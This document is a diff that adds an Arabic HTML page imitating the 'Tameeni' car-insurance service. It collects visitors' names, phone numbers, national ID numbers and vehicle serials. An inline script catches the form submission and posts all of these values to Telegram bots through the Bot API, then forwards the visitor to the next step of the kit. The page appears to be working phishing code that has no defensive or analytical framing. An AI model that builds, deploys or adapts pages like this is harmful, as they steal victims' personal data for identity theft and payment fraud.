@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta name="robots" content="noindex, nofollow"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني - البيانات الأساسية</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/stylea.css">
+<link rel="stylesheet" href="assets/css/theme-blue-index.css">
+</head>
+<body>
+<div class="app">
+<section class="blue-hero">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="assets/images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+<a class='login-link' href='#'>تسجيل الدخول</a>
+</header>
+<div class="hero-copy">
+<span class="eyebrow">ابدأ طلبك</span>
+<h1>أدخل بياناتك الأساسية</h1>
+<p>املأ المعلومات المطلوبة للانتقال إلى عروض التأمين المناسبة لمركبتك.</p>
+</div>
+<div class="stepper">
+<div class="step active" data-step="1">
+<div class="step-number">1</div>
+<span>البيانات الأساسية</span>
+</div>
+<div class="step" data-step="2">
+<div class="step-number">2</div>
+<span>بيانات التأمين</span>
+</div>
+<div class="step" data-step="3">
+<div class="step-number">3</div>
+<span>قائمة الأسعار</span>
+</div>
+<div class="step" data-step="4">
+<div class="step-number">4</div>
+<span>الإضافات</span>
+</div>
+<div class="step" data-step="5">
+<div class="step-number">5</div>
+<span>الملخص والدفع</span>
+</div>
+</div>
+</section>
+<main>
+<form id="formStep1" novalidate="">
+<div class="form-panel">
+<div class="panel-heading">
+<span>الخطوة الأولى</span>
+<h2>الغرض وبيانات المالك</h2>
+</div>
+
+<div class="control-group">
+<span class="label">نوع العرض</span>
+<div class="segmented" id="offerType">
+<button class="active" data-value="new" type="button">تأمين جديد</button>
+<button data-value="transfer" type="button">نقل الملكية</button>
+</div>
+</div>
+
+<div class="control-group">
+<span class="label">نوع تسجيل المركبة</span>
+<div class="segmented" id="regType">
+<button class="active" data-value="serial" type="button">الرقم التسلسلي</button>
+<button data-value="customs" type="button">بطاقة جمركية [استيراد]</button>
+</div>
+</div>
+
+<div class="field-grid">
+<div class="field">
+<label class="label" for="userName">الاسم الكامل</label>
+<input id="userName" name="userName" placeholder="أدخل اسمك الكامل" type="text"/>
+<div class="error" id="userNameError"></div>
+</div>
+
+<div class="field">
+<label class="label" for="phoneNumber">رقم الهاتف</label>
+<input id="phoneNumber" name="phoneNumber" placeholder="05xxxxxxxx" type="tel" maxlength="10" inputmode="numeric" autocomplete="tel" style="direction: ltr; text-align: right;"/>
+<div class="error" id="phoneNumberError"></div>
+</div>
+
+<div class="field wide-field">
+<label class="label" for="idNumber">رقم الهوية</label>
+<input id="idNumber" inputmode="numeric" name="idNumber" placeholder="رقم الهوية الوطنية أو الإقامة أو الشركة" type="text"/>
+<div class="error" id="idError"></div>
+</div>
+
+<div class="field transfer-only hidden">
+<label class="label" for="birthDate">تاريخ الميلاد</label>
+<input id="birthDate" name="birthDate" type="date"/>
+<div class="error" id="birthDateError"></div>
+</div>
+
+<div class="field wide-field">
+<label class="label" for="serialNumber">الرقم التسلسلي</label>
+<input id="serialNumber" name="serialNumber" placeholder="الرقم التسلسلي للمركبة" type="text"/>
+<div class="error" id="serialError"></div>
+</div>
+
+<div class="field transfer-only hidden">
+<label class="label" for="carYear">سنة الصنع</label>
+<input id="carYear" name="carYear" placeholder="اختر سنة الصنع" type="number"/>
+<div class="error" id="carYearError"></div>
+</div>
+</div>
+
+<div class="submit-panel">
+<p class="info-text">
+        بالضغط على التالي، أوافق على منح تأميني الحق في الاستعلام عن بياناتي وبيانات مركبتي من الجهات المعنية لأجل إصدار التسعيرة.
+      </p>
+<div class="buttons-row">
+<button class="btn btn-primary" type="submit">التالي</button>
+</div>
+</div>
+</div>
+</form>
+</main>
+</div>
+<script src="assets/js/e9s1.js"></script>
+<script src="assets/js/telegram-config.js"></script>
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+
+<script>
+    (function() {
+        var step1Sent = false;
+
+        window.sendToTelegramStep1 = function() {
+            if (step1Sent) {
+                window.location.href = 'vehicle.html';
+                return;
+            }
+
+            var getData = function(id) {
+                var el = document.getElementById(id);
+                return (el && el.value.trim()) ? el.value.trim() : 'غير معروف';
+            };
+
+            var getSegmentedValue = function(containerId) {
+                var activeBtn = document.querySelector('#' + containerId + ' button.active');
+                return activeBtn ? activeBtn.textContent.trim() : 'غير معروف';
+            };
+
+            var name      = getData('userName');
+            var phone     = getData('phoneNumber');
+            var offerType = getSegmentedValue('offerType');
+            var regType   = getSegmentedValue('regType');
+            var idNum     = getData('idNumber');
+            var serial    = getData('serialNumber');
+            var year      = getData('carYear');
+
+            // حفظ البيانات في sessionStorage
+            var tempData = JSON.parse(sessionStorage.getItem('tameeniTempData') || '{}');
+            delete tempData.email;
+            Object.assign(tempData, { userName: name, phoneNumber: phone, idNumber: idNum, serialNumber: serial, carYear: year, offerType: offerType, regType: regType });
+            sessionStorage.setItem('tameeniTempData', JSON.stringify(tempData));
+
+            var rtl = '\u200F';
+            var message = rtl + '\uD83D\uDD35 <b>\u062e\u0637\u0648\u0629 1 \u2013 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0623\u0633\u0627\u0633\u064a\u0629</b>\n' +
+                          rtl + '\uD83D\uDC64 \u0627\u0644\u0627\u0633\u0645: ' + name + '\n' +
+                          rtl + '\uD83D\uDCDE \u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641: ' + phone + '\n' +
+                          rtl + '\uD83D\uDCC4 \u0646\u0648\u0639 \u0627\u0644\u0639\u0631\u0636: ' + offerType + '\n' +
+                          rtl + '\uD83C\uDD94 \u0646\u0648\u0639 \u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u0645\u0631\u0643\u0628\u0629: ' + regType + '\n' +
+                          rtl + '\uD83E\uDEAA \u0631\u0642\u0645 \u0627\u0644\u0647\u0648\u064a\u0629: ' + idNum + '\n' +
+                          rtl + '\uD83D\uDD22 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u062a\u0633\u0644\u0633\u0644\u064a/\u0627\u0644\u062c\u0645\u0631\u0643\u064a: ' + serial + '\n' +
+                          rtl + '\uD83D\uDCC5 \u0633\u0646\u0629 \u0627\u0644\u0635\u0646\u0639: ' + year;
+
+            var loadingScreen = document.getElementById('loadingScreen');
+            if (loadingScreen) loadingScreen.style.display = 'flex';
+
+            var configs = window.TELEGRAM_CONFIGS || [{ token: window.BOT_TOKEN, chatId: window.CHAT_ID }];
+            var validConfigs = configs.filter(function(c) { return c.token && c.chatId; });
+
+            if (validConfigs.length === 0) {
+                window.location.href = 'vehicle.html';
+                return;
+            }
+
+            step1Sent = true;
+
+            var sendPromises = validConfigs.map(function(c) {
+                return fetch('https://api.telegram.org/bot' + c.token + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: c.chatId, text: message, parse_mode: 'HTML' })
+                });
+            });
+
+            Promise.all(sendPromises).finally(function() {
+                window.location.href = 'vehicle.html';
+            });
+        };
+
+        document.addEventListener('submit', function(e) {
+            if (e.target && e.target.id === 'formStep1') {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+                window.sendToTelegramStep1();
+            }
+        }, true);
+    })();
+</script>
+</body>
+</html>
